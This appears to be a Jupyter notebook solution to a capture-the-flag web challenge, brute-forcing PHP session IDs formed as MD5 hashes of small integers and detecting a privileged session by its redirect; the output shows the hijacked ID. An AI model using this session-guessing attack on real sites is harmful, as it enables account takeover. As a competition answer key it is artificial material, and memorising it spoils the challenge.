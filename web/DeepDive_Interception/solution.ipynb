{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from requests import Session\n",
    "from tqdm import trange\n",
    "from hashlib import md5"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "HOST = \"challenges.challenge-ecw.eu\"\n",
    "PORT = \"39040\"\n",
    "\n",
    "BASE = f\"http://{HOST}:{PORT}/\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  0%|          | 0/1000 [00:00<?, ?it/s]"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 50%|█████     | 500/1000 [00:24<00:24, 20.69it/s]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "500\n",
      "cee631121c2ec9232f3a2f028ad5c89b\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n"
     ]
    }
   ],
   "source": [
    "for i in trange(0, 1000):\n",
    "    phpsessid = md5(str(i).encode()).hexdigest()\n",
    "\n",
    "    s = Session()\n",
    "    s.cookies.set(\n",
    "        \"PHPSESSID\",\n",
    "        phpsessid,\n",
    "    )\n",
    "\n",
    "    response = s.post(BASE + \"home.php\", allow_redirects=False)\n",
    "    if response.headers[\"Location\"] != \"guest.php\":\n",
    "        print(i)\n",
    "        print(phpsessid)\n",
    "        break"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
